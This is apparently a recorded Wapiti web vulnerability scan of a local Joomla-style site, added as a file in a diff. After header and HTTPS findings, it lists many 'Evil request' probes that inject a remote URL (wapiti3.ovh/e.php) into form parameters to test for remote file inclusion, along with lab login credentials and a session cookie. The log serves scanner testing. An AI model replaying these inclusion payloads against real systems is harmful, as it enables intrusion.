@@ -1,0 +1,405 @@
+
+     __      __               .__  __  .__________
+    /  \    /  \_____  ______ |__|/  |_|__\_____  \
+    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
+     \        /  / __ \|  |_> >  ||  | |  |/       \
+      \__/\  /  (____  /   __/|__||__| |__/______  /
+           \/        \/|__|                      \/
+Wapiti 3.2.10 (wapiti-scanner.github.io)
+Secure flag is not set on the cookie: '4fdf85bb7d463396134b2ed2e6d7c067' set at 'http://127.0.0.1:18026/'
+X-Frame-Options is not set on http://127.0.0.1:18026/
+X-Content-Type-Options is not set on http://127.0.0.1:18026/
+CSP is not set for URL: http://127.0.0.1:18026/
+Sensitive data (cookie in the response) was sent over an unencrypted HTTP connection to http://127.0.0.1:18026/. The server did not enforce HTTPS.
+Potential full path disclosure in http://127.0.0.1:18026/: /media/system/js/caption.js
+Potential full path disclosure in http://127.0.0.1:18026/: /media/system/js/html5fallback.js
+Potential full path disclosure in http://127.0.0.1:18026/: /media/system/images/livemarks.png
+Sensitive data (GET parameters) was sent over an unencrypted HTTP connection to http://127.0.0.1:18026/?format=feed&type=atom. The server did not enforce HTTPS.
+Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://127.0.0.1:18026/. The server redirected, but not to an HTTPS URL, leaving the initial data and the redirection exposed.
+Host 127.0.0.1:18026 serves HTTP content without redirecting to HTTPS.
+Potential full path disclosure in http://127.0.0.1:18026/4-about-your-home-page: /media/system/images/arrow.png
+Potential full path disclosure in http://127.0.0.1:18026/component/mailto/?tmpl=component&template=protostar&link=ece05a2894029932fc2685a9c29d74343ad88187: /media/system/js/core.js
+Cleartext transmission of sensitive information: Password field 'password' is sent over unencrypted connections from URL http://127.0.0.1:18026/author-login
+Sensitive data (POST data) was sent over an unencrypted HTTP connection to http://127.0.0.1:18026/index.php. The server did not enforce HTTPS.
+Potential full path disclosure in http://127.0.0.1:18026/log-out?view=reset: /media/system/js/punycode.js
+Potential full path disclosure in http://127.0.0.1:18026/log-out?view=reset: /media/system/js/validate.js
+Cleartext transmission of sensitive information: Password field 'password' is sent over unencrypted connections from URL http://127.0.0.1:18026/login
+Cleartext transmission of sensitive information: Password field 'password' is sent over unencrypted connections from URL http://127.0.0.1:18026/log-out
+[*] Saving scan state, please wait...
+This scan has been saved in the file /home/kali/.wapiti/scans/127.0.0.1_18026_folder_80ec40fa.db
+[*] Wapiti found 87 URLs and forms during the scan
+
+[*] Launching module redirect
+
+[*] Launching module ssrf
+[*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=q9lklz for results, please wait...
+
+[*] Launching module exec
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/
+Evil request:
+    GET /?format=feed&type=id HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+---
+
+[*] Launching module file
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/author-login
+Evil request:
+    GET /author-login?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/log-out
+Evil request:
+    GET /log-out?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/
+Evil request:
+    GET /?format=feed&type=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/login
+Evil request:
+    GET /login?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/author-login
+Evil request:
+    POST /author-login?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/author-login
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 140
+    Content-Type: application/x-www-form-urlencoded
+
+    username=alice&password=Letm3in_&remember=yes&return=aW5kZXgucGhwP29wdGlvbj1jb21fdXNlcnMmdmlldz1wcm9maWxl&1eb3d106ebc98328dd49388d84969508=1
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/
+Evil request:
+    POST / HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=101
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/about
+Evil request:
+    POST /about HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/about
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=108
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/mailto/
+Evil request:
+    POST /component/mailto/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/mailto/
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 93
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=default
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/author-login
+Evil request:
+    POST /author-login HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/author-login
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=115
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 93
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=default
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 118
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&areas%5B%5D=tags&areas%5B%5D=tags&areas%5B%5D=tags&areas%5B%5D=tags&areas%5B%5D=tags&searchphrase=all&Search=&ordering=newest
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/?searchword=default&searchphrase=all&Itemid=101
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=101
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/?searchword=default&searchphrase=all&Itemid=108
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=108
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/?searchword=default&searchphrase=all&Itemid=115
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=115
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/?searchword=default&searchphrase=all&Itemid=0
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 87
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=0
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/?searchword=default&searchphrase=all&Itemid=107
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=107
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/component/search/
+Evil request:
+    POST /component/search/ HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/component/search/?searchword=default&searchphrase=all&Itemid=102
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=102
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/log-out
+Evil request:
+    POST /log-out?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/log-out?view=reset
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 79
+    Content-Type: application/x-www-form-urlencoded
+
+    jform%5Bemail%5D=wapiti2021%40mailinator.com&d19cdbb8485f4e03aaa65b9e556321a4=1
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/log-out
+Evil request:
+    POST /log-out?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/log-out
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 140
+    Content-Type: application/x-www-form-urlencoded
+
+    username=alice&password=Letm3in_&remember=yes&return=aW5kZXgucGhwP29wdGlvbj1jb21fdXNlcnMmdmlldz1wcm9maWxl&d19cdbb8485f4e03aaa65b9e556321a4=1
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/login
+Evil request:
+    POST /login?task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/login
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 118
+    Content-Type: application/x-www-form-urlencoded
+
+    username=alice&password=Letm3in_&remember=yes&return=aW5kZXgucGhwP0l0ZW1pZD0xMDE%3D&d19cdbb8485f4e03aaa65b9e556321a4=1
+---
+---
+Received a HTTP 500 error in http://127.0.0.1:18026/log-out
+Evil request:
+    POST /log-out HTTP/1.1
+    host: 127.0.0.1:18026
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    content-type: application/x-www-form-urlencoded
+    referer: http://127.0.0.1:18026/log-out?view=reset
+    cookie: 4fdf85bb7d463396134b2ed2e6d7c067=be316088d0f4deafa5adebcdd418f7f0
+    content-length: 89
+    Content-Type: application/x-www-form-urlencoded
+
+    searchword=default&task=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&option=com_search&Itemid=107
+---
